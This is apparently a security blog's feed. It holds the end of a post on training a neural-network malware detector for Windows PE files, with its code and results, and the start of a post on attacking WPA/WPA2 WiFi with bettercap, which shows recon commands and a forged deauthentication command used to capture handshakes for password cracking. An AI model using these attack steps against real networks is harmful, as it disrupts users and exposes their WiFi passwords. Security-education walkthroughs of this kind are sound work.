<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># the 'pe' argument holds the PE object parsed by LIEF</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_libraries</span><span class="params">(pe)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libraries</span><br><span class="line"></span><br><span class="line">    imports = &#123;dll.name.lower():[api.name <span class="keyword">if</span> <span class="keyword">not</span> api.is_ordinal <span class="keyword">else</span> api.iat_address \</span><br><span class="line">                           <span class="keyword">for</span> api <span class="keyword">in</span> dll.entries] <span class="keyword">for</span> dll <span class="keyword">in</span> pe.imports&#125;</span><br><span class="line"></span><br><span class="line">    libs = np.array([<span class="number">0.0</span>] * len(libraries))</span><br><span class="line">    <span class="keyword">for</span> idx, lib <span class="keyword">in</span> enumerate(libraries):</span><br><span class="line">        calls = <span class="number">0</span></span><br><span class="line">        dll   = <span class="string">"%s.dll"</span> % lib</span><br><span class="line">        <span class="keyword">if</span> lib <span class="keyword">in</span> imports:</span><br><span class="line">            calls = len(imports[lib])</span><br><span class="line">        <span class="keyword">elif</span> dll <span class="keyword">in</span> imports:</span><br><span class="line">            calls = len(imports[dll])</span><br><span class="line">        libs[idx] += calls</span><br><span class="line">    tot = libs.sum()</span><br><span class="line">    <span class="keyword">return</span> ( libs / tot ) <span class="keyword">if</span> tot &gt; <span class="number">0</span> <span class="keyword">else</span> libs <span class="comment"># normalize</span></span><br></pre></td></tr></table></figure>
<p>We proceed to encode the ratio of the PE size on disk vs the size it’ll have in memory (its <em>virtual size</em>):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">min(sz, pe.virtual_size) / max(sz, pe.virtual_size)</span><br></pre></td></tr></table></figure>
<p>Next, we want to encode some information about the PE sections, such the amount of them containing code vs the ones containing data, the sections marked as executable, the average <a href="https://en.wikipedia.org/wiki/Entropy_(information_theory" target="_blank" rel="noopener">Shannon entropy</a>) of each one and the average ratio of their size vs their virtual size - these datapoints will tell the model if and how the PE is packed/compressed/obfuscated:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_sections</span><span class="params">(pe)</span>:</span></span><br><span class="line">    sections = [&#123; \</span><br><span class="line">        <span class="string">'characteristics'</span>: <span class="string">','</span>.join(map(str, s.characteristics_lists)),</span><br><span class="line">        <span class="string">'entropy'</span>: s.entropy,</span><br><span class="line">        <span class="string">'name'</span>: s.name,</span><br><span class="line">        <span class="string">'size'</span>: s.size,</span><br><span class="line">        <span class="string">'vsize'</span>: s.virtual_size &#125; <span class="keyword">for</span> s <span class="keyword">in</span> pe.sections]</span><br><span class="line"></span><br><span class="line">    num_sections = len(sections)</span><br><span class="line">    max_entropy  = max([s[<span class="string">'entropy'</span>] <span class="keyword">for</span> s <span class="keyword">in</span> sections]) <span class="keyword">if</span> num_sections <span class="keyword">else</span> <span class="number">0.0</span></span><br><span class="line">    max_size     = max([s[<span class="string">'size'</span>] <span class="keyword">for</span> s <span class="keyword">in</span> sections]) <span class="keyword">if</span> num_sections <span class="keyword">else</span> <span class="number">0.0</span> </span><br><span class="line">    min_vsize    = min([s[<span class="string">'vsize'</span>] <span class="keyword">for</span> s <span class="keyword">in</span> sections]) <span class="keyword">if</span> num_sections <span class="keyword">else</span> <span class="number">0.0</span></span><br><span class="line">    norm_size    = (max_size / min_vsize) <span class="keyword">if</span> min_vsize &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [ \</span><br><span class="line">        <span class="comment"># code_sections_ratio</span></span><br><span class="line">        (len([s <span class="keyword">for</span> s <span class="keyword">in</span> sections <span class="keyword">if</span> <span class="string">'SECTION_CHARACTERISTICS.CNT_CODE'</span> <span class="keyword">in</span> s[<span class="string">'characteristics'</span>]]) / num_sections) <span class="keyword">if</span> num_sections <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">        <span class="comment"># pec_sections_ratio</span></span><br><span class="line">        (len([s <span class="keyword">for</span> s <span class="keyword">in</span> sections <span class="keyword">if</span> <span class="string">'SECTION_CHARACTERISTICS.MEM_EXECUTE'</span> <span class="keyword">in</span> s[<span class="string">'characteristics'</span>]]) / num_sections) <span class="keyword">if</span> num_sections <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">        <span class="comment"># sections_avg_entropy</span></span><br><span class="line">        ((sum([s[<span class="string">'entropy'</span>] <span class="keyword">for</span> s <span class="keyword">in</span> sections]) / num_sections) / max_entropy) <span class="keyword">if</span> max_entropy &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0.0</span>,</span><br><span class="line">        <span class="comment"># sections_vsize_avg_ratio</span></span><br><span class="line">        ((sum([s[<span class="string">'size'</span>] / s[<span class="string">'vsize'</span>] <span class="keyword">for</span> s <span class="keyword">in</span> sections]) / num_sections) / norm_size) <span class="keyword">if</span> norm_size &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0.0</span>,</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
<p>Last, we glue all the pieces into one single vector of size <code>486</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v = np.concatenate([ \</span><br><span class="line">	encode_properties(pe),</span><br><span class="line">	encode_entrypoint(ep_bytes),</span><br><span class="line">	encode_histogram(raw),</span><br><span class="line">	encode_libraries(pe),</span><br><span class="line">	[ min(sz, pe.virtual_size) / max(sz, pe.virtual_size)],</span><br><span class="line">	encode_sections(pe)</span><br><span class="line">	])</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> v</span><br></pre></td></tr></table></figure>
<p>The only thing left to do, is telling our model how to encode the input samples by customizing the <code>prepare_input</code> function in the <code>prepare.py</code> file previously created by ergo - the following implementation supports the encoding of a file given its path, given its contents (sent as a file upload to the ergo API), or just the evaluation on a raw vector of scalar features:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># used by `ergo encode &lt;path&gt; &lt;folder&gt;` to encode a PE in a vector of scalar features</span></span><br><span class="line"><span class="comment"># used by `ergo serve &lt;path&gt;` to parse the input query before running the inference</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare_input</span><span class="params">(x, is_encoding = False)</span>:</span></span><br><span class="line">    <span class="comment"># file upload</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(x, werkzeug.datastructures.FileStorage):</span><br><span class="line">        <span class="keyword">return</span> encoder.encode_pe(x)</span><br><span class="line">    <span class="comment"># file path</span></span><br><span class="line">    <span class="keyword">elif</span> os.path.isfile(x) :</span><br><span class="line">        <span class="keyword">return</span> encoder.encode_pe(x)</span><br><span class="line">    <span class="comment"># raw vector</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x.split(<span class="string">','</span>)</span><br></pre></td></tr></table></figure>
<p>Now we have everything we need to transform something <a href="https://www.virustotal.com/gui/file/0830ea172eb905973e52c44f8a5ce44eccba53402ac81ddb4f4d612e8d069a25/detection" target="_blank" rel="noopener">like this</a>, to something like this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.333333333333,0.545098039216,0.925490196078,0.41568627451,1.0,0.407843137255,0.596078431373,0.192156862745,0.250980392157,0.0,0.407843137255,0.188235294118,0.149019607843,0.250980392157,0.0,0.392156862745,0.63137254902,0.0,0.0,0.0,0.0,0.313725490196,0.392156862745,0.537254901961,0.145098039216,0.0,0.0,0.0,0.0,0.513725490196,0.925490196078,0.407843137255,0.325490196078,0.337254901961,0.341176470588,0.537254901961,0.396078431373,0.909803921569,0.2,0.858823529412,0.537254901961,0.364705882353,0.988235294118,0.41568627451,0.0078431372549,1.0,0.0823529411765,0.972549019608,0.188235294118,0.250980392157,0.0,0.349019607843,0.513725490196,0.0509803921569,0.0941176470588,0.270588235294,0.250980392157,0.0,1.0,0.513725490196,0.0509803921569,0.109803921569,0.270588235294,0.250980392157,0.870149739583,0.00198567708333,0.00146484375,0.000944010416667,0.000830078125,0.00048828125,0.000162760416667,0.000325520833333,0.000569661458333,0.000130208333333,0.000130208333333,8.13802083333e-05,0.000553385416667,0.000390625,0.000162760416667,0.00048828125,0.000895182291667,8.13802083333e-05,0.000179036458333,8.13802083333e-05,0.00048828125,0.001611328125,0.000162760416667,9.765625e-05,0.000472005208333,0.000146484375,3.25520833333e-05,8.13802083333e-05,0.000341796875,0.000130208333333,3.25520833333e-05,1.62760416667e-05,0.001171875,4.8828125e-05,0.000130208333333,1.62760416667e-05,0.00372721354167,0.000699869791667,6.51041666667e-05,8.13802083333e-05,0.000569661458333,0.0,0.000113932291667,0.000455729166667,0.000146484375,0.000211588541667,0.000358072916667,1.62760416667e-05,0.00208333333333,0.00087890625,0.000504557291667,0.000846354166667,0.000537109375,0.000439453125,0.000358072916667,0.000276692708333,0.000504557291667,0.000423177083333,0.000276692708333,3.25520833333e-05,0.000211588541667,0.000146484375,0.000130208333333,0.0001953125,0.00577799479167,0.00109049479167,0.000227864583333,0.000927734375,0.002294921875,0.000732421875,0.000341796875,0.000244140625,0.000276692708333,0.000211588541667,3.25520833333e-05,0.000146484375,0.00135091145833,0.000341796875,8.13802083333e-05,0.000358072916667,0.00193684895833,0.0009765625,0.0009765625,0.00123697916667,0.000699869791667,0.000260416666667,0.00078125,0.00048828125,0.000504557291667,0.000211588541667,0.000113932291667,0.000260416666667,0.000472005208333,0.00029296875,0.000472005208333,0.000927734375,0.000211588541667,0.00113932291667,0.0001953125,0.000732421875,0.00144856770833,0.00348307291667,0.000358072916667,0.000260416666667,0.00206705729167,0.001171875,0.001513671875,6.51041666667e-05,0.00157877604167,0.000504557291667,0.000927734375,0.00126953125,0.000667317708333,1.62760416667e-05,0.00198567708333,0.00109049479167,0.00255533854167,0.00126953125,0.00109049479167,0.000325520833333,0.000406901041667,0.000325520833333,8.13802083333e-05,3.25520833333e-05,0.000244140625,8.13802083333e-05,4.8828125e-05,0.0,0.000406901041667,0.000602213541667,3.25520833333e-05,0.00174153645833,0.000634765625,0.00068359375,0.000130208333333,0.000130208333333,0.000309244791667,0.00105794270833,0.000244140625,0.003662109375,0.000244140625,0.00245768229167,0.0,1.62760416667e-05,0.002490234375,3.25520833333e-05,1.62760416667e-05,9.765625e-05,0.000504557291667,0.000211588541667,1.62760416667e-05,4.8828125e-05,0.000179036458333,0.0,3.25520833333e-05,3.25520833333e-05,0.000211588541667,0.000162760416667,8.13802083333e-05,0.0,0.000260416666667,0.000260416666667,0.0,4.8828125e-05,0.000602213541667,0.000374348958333,3.25520833333e-05,0.0,9.765625e-05,0.0,0.000113932291667,0.000211588541667,0.000146484375,6.51041666667e-05,0.000667317708333,4.8828125e-05,0.000276692708333,4.8828125e-05,8.13802083333e-05,1.62760416667e-05,0.000227864583333,0.000276692708333,0.000146484375,3.25520833333e-05,0.000276692708333,0.000244140625,8.13802083333e-05,0.0001953125,0.000146484375,9.765625e-05,6.51041666667e-05,0.000358072916667,0.00113932291667,0.000504557291667,0.000504557291667,0.0005859375,0.000813802083333,4.8828125e-05,0.000162760416667,0.000764973958333,0.000244140625,0.000651041666667,0.000309244791667,0.0001953125,0.000667317708333,0.000162760416667,4.8828125e-05,0.0,0.000162760416667,0.000553385416667,1.62760416667e-05,0.000130208333333,0.000146484375,0.000179036458333,0.000276692708333,9.765625e-05,0.000406901041667,0.000162760416667,3.25520833333e-05,0.000211588541667,8.13802083333e-05,1.62760416667e-05,0.000130208333333,8.13802083333e-05,0.000276692708333,0.000504557291667,9.765625e-05,1.62760416667e-05,9.765625e-05,3.25520833333e-05,1.62760416667e-05,0.0,0.00138346354167,0.000732421875,6.51041666667e-05,0.000146484375,0.000341796875,3.25520833333e-05,4.8828125e-05,4.8828125e-05,0.000260416666667,3.25520833333e-05,0.00068359375,0.000960286458333,0.000227864583333,9.765625e-05,0.000244140625,0.000813802083333,0.000179036458333,0.000439453125,0.000341796875,0.000146484375,0.000504557291667,0.000504557291667,9.765625e-05,0.00760091145833,0.0,0.370786516854,0.0112359550562,0.168539325843,0.0,0.0,0.0337078651685,0.0,0.0,0.0,0.303370786517,0.0112359550562,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0561797752809,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0449438202247,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.25,0.25,0.588637653212,0.055703845605</span><br></pre></td></tr></table></figure>
<p>Assuming you have a folder containing malicious samples in the <code>pe-malicious</code> subfolder and clean ones in <code>pe-legit</code> (feel free to give them any name, but the folder names will become the labels associated to each of the samples), you can start the encoding process to a <code>dataset.csv</code> file that our model can use for training with:</p>
<pre><code>ergo encode /path/to/ergo-pe-av /path/to/dataset --output /path/to/dataset.csv
</code></pre><p>Take a coffee and relax, depending on the size of your dataset and how fast the disk where it’s stored is, this process might take quite some time :)</p>
<h3 id="An-useful-property-of-the-vectors"><a href="#An-useful-property-of-the-vectors" class="headerlink" title="An useful property of the vectors"></a>An useful property of the vectors</h3><p>While ergo is encoding our dataset, let’s take a break to discuss an interesting property of these vectors and how to use it. </p>
<p>It’ll be clear to the reader by now that structurally and/or behaviourally similar executables will have similar vectors, where the distance/difference from one vector and another can be measured, for instance, by using the <a href="https://en.wikipedia.org/wiki/Cosine_similarity" target="_blank" rel="noopener">Cosine similarity</a>, defined as:</p>
<center><br><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/1d94e5903f7936d3c131e040ef2c51b473dd071d"><br></center>

<p>This metric can be used, among other things, to extract from the dataset (that, let me remind, is a huge set of files you don’t really know much about other if they’re malicious or not) all the samples of a given family given a known “pivot” sample. Say, for instance, that you have a Mirai sample for MIPS, and you want to extract every Mirai variant for any architecture from a dataset of thousands of different unlabeled samples.</p>
<p>The algorithm, that I implemented inside the <a href="https://github.com/evilsocket/sum" target="_blank" rel="noopener">sum database</a> as the <code>findSimilar</code> <em>“oracle”</em> (a fancy name for <em>stored procedure</em>), is quite simple:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Given the vector with id="id", return a list of</span></span><br><span class="line"><span class="comment">// other vectors which cosine similarity to the reference</span></span><br><span class="line"><span class="comment">// one is greater or equal than the threshold.</span></span><br><span class="line"><span class="comment">// Results are given as a dictionary of :</span></span><br><span class="line"><span class="comment">//      "vector_id =&gt; similarity"</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findSimilar</span>(<span class="params">id, threshold</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v = records.Find(id);</span><br><span class="line">    <span class="keyword">if</span>( v.IsNull() == <span class="literal">true</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> ctx.Error(<span class="string">"Vector "</span> + id + <span class="string">" not found."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> results = &#123;&#125;;</span><br><span class="line">    records.AllBut(v).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">record</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> similarity = v.Cosine(record);</span><br><span class="line">        <span class="keyword">if</span>( similarity &gt;= threshold ) &#123;</span><br><span class="line">           results[record.ID] = similarity</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Yet quite effective:</p>
<p><img src="https://raw.githubusercontent.com/evilsocket/sum/master/malware_elf.png"></p>
<h3 id="ANN-as-a-black-box-and-Training"><a href="#ANN-as-a-black-box-and-Training" class="headerlink" title="ANN as a black box and Training"></a>ANN as a black box and Training</h3><p>Meanwhile, our encoder should have finished doing its job and the resulting <code>dataset.csv</code> file containing all the labeled vectors extracted from each of the samples should be ready to be used for training our model … but what <em>“training our model”</em> actually means? And what’s this <em>“model”</em> in the first place?</p>
<p>The model we’re using is a computational structure called <a href="https://en.wikipedia.org/wiki/Artificial_neural_network" target="_blank" rel="noopener">Artificial neural network</a> that we’re training using the <a href="https://arxiv.org/abs/1412.6980v8" target="_blank" rel="noopener">Adam optimization algorithm</a> . Online you’ll find very detailed and formal definitions of both, but the bottomline is:</p>
<p>An ANN is a “box” containing hundreds of numerical parameters (the <em>“weights”</em> of the “neurons”, organized in layers) that are multiplied with the inputs (our vectors) and combined to produce an output <em>prediction</em>. The training process consists in feeding the system with the dataset, checking the predictions against the known labels, changing those parameters by a small amount, observing if and how those changes affected the model accuracy and repeating this process for a given number of times (<em>epochs</em>) until the overall performance has reached what we defined as the required minimum.</p>
<center><br><img src="https://i.imgur.com/cOwvfAF.png" width="100%"><br><small><a href="[https://www.nature.com/articles/s41467-018-06322-x](https://www.nature.com/articles/s41467-018-06322-x)" target="blank">Credits to nature.com</a></small><br></center>

<p>The main assumption is that <em>there is</em> a numerical correlation among the datapoints in our dataset that we don’t know about but that if known would allow us to divide that dataset into the output classes. What we do is asking this blackbox to ingest the dataset and approximate such function by iteratively tweaking its internal parameters.</p>
<p>Inside the <code>model.py</code> file you’ll find the definition of our ANN, a fully connected network with two hidden layers of 70 neurons each, <a href="https://keras.io/activations/" target="_blank" rel="noopener">ReLU</a> as the activation function and a <a href="https://machinelearningmastery.com/dropout-regularization-deep-learning-models-keras/" target="_blank" rel="noopener">dropout</a> of 30% during training:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n_inputs = <span class="number">486</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Sequential([</span><br><span class="line">    Dense(<span class="number">70</span>, input_shape=(n_inputs,), activation=<span class="string">'relu'</span>),</span><br><span class="line">    Dropout(<span class="number">0.3</span>),</span><br><span class="line">    Dense(<span class="number">70</span>, activation=<span class="string">'relu'</span>),</span><br><span class="line">    Dropout(<span class="number">0.3</span>),</span><br><span class="line">    Dense(<span class="number">2</span>, activation=<span class="string">'softmax'</span>)</span><br><span class="line">])</span><br></pre></td></tr></table></figure>
<p>We can now start the training process with:</p>
<pre><code>ergo train /path/to/ergo-pe-av --dataset /path/to/dataset.csv
</code></pre><p>Depending on the total amount of vectors in the CSV file, this process might take from a few minutes, to hours, to days. In case you have GPUs on your machine, ergo will automatically use them instead of the CPU cores in order to significantly speed the training up (check <a href="https://www.datascience.com/blog/cpu-gpu-machine-learning" target="_blank" rel="noopener">this article</a> if you’re curious why).</p>
<p>Once done, you can inspect the model performance statistics with:</p>
<pre><code>ergo view /path/to/ergo-pe-av
</code></pre><p>This will show the training history, where we can verify that the model accuracy indeed increased over time (in our case, it got to a 97% accuracy around epoch 30), and the <a href="https://towardsdatascience.com/understanding-auc-roc-curve-68b2303cc9c5" target="_blank" rel="noopener">ROC curve</a>, which tells us how effectively the model can distinguish between malicious or not (an AUC, or area under the curve, of 0.994, means that the model is pretty good):</p>
<table>
<thead>
<tr>
<th>Training</th>
<th>ROC/AUC</th>
</tr>
</thead>
<tbody>
<tr>
<td><img src="https://raw.githubusercontent.com/evilsocket/ergo-pe-av/master/history.png" alt></td>
<td><img src="https://raw.githubusercontent.com/evilsocket/ergo-pe-av/master/roc.png" alt></td>
</tr>
</tbody>
</table>
<p>Moreover, a confusion matrix for each of the training, validation and test sets will also be shown. The diagonal values from the top left (dark red) represent the number of correct predictions,  while the other values (pink) are the wrong ones (our model has a 1.4% false positives rate on a test set of ~30000 samples):</p>
<table>
<thead>
<tr>
<th>Training</th>
<th>Validation</th>
<th>Testing</th>
</tr>
</thead>
<tbody>
<tr>
<td><img src="https://raw.githubusercontent.com/evilsocket/ergo-pe-av/master/training_cm.png" alt></td>
<td><img src="https://raw.githubusercontent.com/evilsocket/ergo-pe-av/master/validation_cm.png" alt></td>
<td><img src="https://raw.githubusercontent.com/evilsocket/ergo-pe-av/master/test_cm.png" alt></td>
</tr>
</tbody>
</table>
<p>97% accuracy on such a big dataset is a very interesting result considering how simple our features extraction algorithm is. Many of the misdetections are caused by packers such as UPX (or even just self extracting zip/msi archives) that affect some of the datapoints we’re encoding - adding an unpacking strategy (such as emulating the unpacking stub until the real PE is in memory) and more features (bigger entrypoint vector, dynamic analysis to trace the API being called, imagination is the limit!) is the key to get it to 99% :)</p>
<h3 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h3><p>We can now remove the temporary files:</p>
<pre><code>ergo clean /path/to/ergo-pe-av
</code></pre><p>Load the model and use it as an API:</p>
<pre><code>ergo serve /path/to/ergo-pe-av --classes &quot;clean, malicious&quot;
</code></pre><p>And request its classification from a client:</p>
<pre><code>curl -F &quot;x=@/path/to/file.exe&quot; &quot;http://localhost:8080/&quot;
</code></pre><p>You’ll get a response like the following (<a href="https://www.virustotal.com/gui/file/af66d5db635537de043facf1580f9655fe441f03f82a7503272e32e3d8473af5/detection" target="_blank" rel="noopener">here the file being scanned</a>):</p>
<center><br><img src="https://i.imgur.com/KaWLY2g.png" width="100%"><br><small>The model detecting a sample as malicious with over 99% confidence.</small><br></center>

<p>Now you can use the model to scan whatever you want, enjoy! :)</p>
<center><br><img src="https://imgs.xkcd.com/comics/machine_learning.png"><br></center>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;In this post we’ll talk about two topics I love and that have been central elements of my (private) research for the last ~7 years: machi
    
    </summary>
    
    
      <category term="ergo" scheme="https://www.evilsocket.net/tags/ergo/"/>
    
      <category term="keras" scheme="https://www.evilsocket.net/tags/keras/"/>
    
      <category term="tensorflow" scheme="https://www.evilsocket.net/tags/tensorflow/"/>
    
      <category term="tf" scheme="https://www.evilsocket.net/tags/tf/"/>
    
      <category term="deep learning" scheme="https://www.evilsocket.net/tags/deep-learning/"/>
    
      <category term="dnn" scheme="https://www.evilsocket.net/tags/dnn/"/>
    
      <category term="machine learning" scheme="https://www.evilsocket.net/tags/machine-learning/"/>
    
      <category term="neural networks" scheme="https://www.evilsocket.net/tags/neural-networks/"/>
    
      <category term="ai" scheme="https://www.evilsocket.net/tags/ai/"/>
    
      <category term="deep neural networks" scheme="https://www.evilsocket.net/tags/deep-neural-networks/"/>
    
      <category term="cuda" scheme="https://www.evilsocket.net/tags/cuda/"/>
    
      <category term="nvidia" scheme="https://www.evilsocket.net/tags/nvidia/"/>
    
      <category term="malware" scheme="https://www.evilsocket.net/tags/malware/"/>
    
      <category term="malware detection" scheme="https://www.evilsocket.net/tags/malware-detection/"/>
    
      <category term="computer virus" scheme="https://www.evilsocket.net/tags/computer-virus/"/>
    
      <category term="windows pe" scheme="https://www.evilsocket.net/tags/windows-pe/"/>
    
      <category term="portable executable" scheme="https://www.evilsocket.net/tags/portable-executable/"/>
    
  </entry>
  
  <entry>
    <title>Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack</title>
    <link href="https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/"/>
    <id>https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/</id>
    <published>2019-02-13T15:53:31.000Z</published>
    <updated>2019-10-19T08:14:27.111Z</updated>
    
    <content type="html"><![CDATA[<p>In this post, I’ll talk about the new WiFi related features that have been recently implemented into bettercap, starting from how the EAPOL <a href="https://wlan1nde.wordpress.com/2014/10/27/4-way-handshake/" target="_blank" rel="noopener">4-way handshake</a> capturing has been automated, to a whole new type of attack that will allow us to recover WPA PSK passwords of an AP without clients.</p>
<p><img src="https://raw.githubusercontent.com/bettercap/media/master/logo.png" alt="logo"></p>
<p>We’ll start with the assumption that your WiFi card supports monitor mode and packet injection (I use an <code>AWUS1900</code> with <a href="https://github.com/aircrack-ng/rtl8812au" target="_blank" rel="noopener">this driver</a>), that you have a working <a href="https://hashcat.net/" target="_blank" rel="noopener">hashcat</a> (v4.2.0 or higher is required) installation (ideally with GPU support enabled) for cracking and that you know how to use it properly either for dictionary or brute-force attacks, as no tips on how to tune the masks and/or generate proper dictionaries will be given :)</p>
<div class="note">On newer macOS laptops, the builtin WiFi interface <code>en0</code> already supports monitor mode, meaning you won’t need a Linux VM in order to run this :)</div>

<a id="more"></a>
<h3 id="Deauth-and-4-way-Handshake-Capture"><a href="#Deauth-and-4-way-Handshake-Capture" class="headerlink" title="Deauth and 4-way Handshake Capture"></a>Deauth and 4-way Handshake Capture</h3><p>First thing first, let’s try a classical deauthentication attack: we’ll start bettercap, enable the <code>wifi.recon</code> module with channel hopping and configure the <code>ticker</code> module to refresh our screen every second with an updated view of the nearby WiFi networks (replace <code>wlan0</code> with the interface you want to use):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo bettercap -iface wlan0</span><br><span class="line"></span><br><span class="line"><span class="comment"># this will set the interface in monitor mode and start channel hopping on all supported frequencies</span></span><br><span class="line">&gt; wifi.recon on </span><br><span class="line"><span class="comment"># we want our APs sorted by number of clients for this attack, the default sorting would be `rssi asc`</span></span><br><span class="line">&gt; <span class="built_in">set</span> wifi.show.sort clients desc</span><br><span class="line"><span class="comment"># every second, clear our view and present an updated list of nearby WiFi networks</span></span><br><span class="line">&gt; <span class="built_in">set</span> ticker.commands <span class="string">'clear; wifi.show'</span></span><br><span class="line">&gt; ticker on</span><br></pre></td></tr></table></figure>
<p>You should now see something like this:</p>
<p><img src="/images/2019/02/wifi_recon.png" alt="recon"></p>
<p>Assuming <code>Casa-2.4</code> is the network we want to attack, let’s stick to channel <code>1</code> in order to avoid jumping to other frequencies and potentially losing useful packets:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; wifi.recon.channel 1</span><br></pre></td></tr></table></figure>
<p>What we want to do now is forcing one or more of the client stations (we can see 5 of them for this AP) to disconnect by forging fake deauthentication packets. Once they will reconnect, hopefully, bettercap will capture the needed EAPOL frames of the handshake that we’ll later pass to hashcat for cracking (replace <code>e0:xx:xx:xx:xx:xx</code> with the BSSID of your target AP):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; wifi.deauth e0:xx:xx:xx:xx:xx</span><br></pre></td></tr></table></figure>
